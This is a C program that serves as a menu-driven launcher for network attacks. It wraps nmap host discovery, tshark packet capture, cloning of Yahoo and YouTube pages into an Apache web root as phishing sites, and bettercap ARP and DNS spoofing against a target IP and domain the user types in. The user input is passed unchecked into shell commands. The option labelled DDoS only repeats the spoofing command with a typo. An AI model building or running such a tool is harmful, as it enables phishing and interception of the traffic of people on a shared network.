#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int args)
{

	int option=0;
	printf("Enter the option from selected choice\n");
	printf("1. For checking the devices connected to you system.\n");
	printf("2. TO check your domain ip.\n");
	printf("3. set up YAHOO Physhing attack\n");
	printf("4. Start phshing attack\n");
	printf("5. Stop Physhing attack\n");
	printf("6. set up YOUTUBE Physhing attack\n");
	printf("7. PACKET CAPTURE COMMAND\n");
	printf("8: Launch dns spoof");
	scanf("%d",&option);
	
	
	
	
	
	if(option==1)
	{
		
		system("nmap -sn 192.168.100.1/24");
	}
	else if(option == 2)
	{
		system("ifconfig");
	}
	else if(option == 3)
	{
		//system("service apache2 start");
		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html; ls; wget http://yahoo.com ;dir");
		
		//system("cd .. cd .. cd .. cd .. cd .. cd .. cd . ls");

	}
	else if(option==4)
	{
		system("service apache2 start");
		printf("APACHE STARTED");
		
	}
	else if(option == 5)
	{
		system("service apache2 stop");
		printf("APACHE STOPED");
	}
	else if(option == 6)
	{
		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget https://youtube.com ; dir");
	}
	else if(option ==7)
	{
		system("tshark -i eth0");

	}
	else if(option == 8)
	{
		
		char command[200];
    		char ip_address[16]; // Assuming IPv4 address
    		char attack[100];
		printf("Enter the target IP address: ");
    		scanf("%15s", ip_address);
    
    		printf("\n enter the website ");
    		scanf("%99s", attack);
    	
		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on'", ip_address, attack);

    
    		system(command);
    

	}
	else if(option == 9)
	{
		printf("SHHHHHHH lets launch ddos attack...");
		char command[200];
    		char ip_address[16]; // Assuming IPv4 address
    		char attack[100];
		printf("Enter the target IP address: ");
    		scanf("%15s", ip_address);
    
    		printf("\n enter the website ");
    		scanf("%99s", attack);
    	
		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on, apr.spoof on'", ip_address, attack);

    
    		system(command);
	}
}
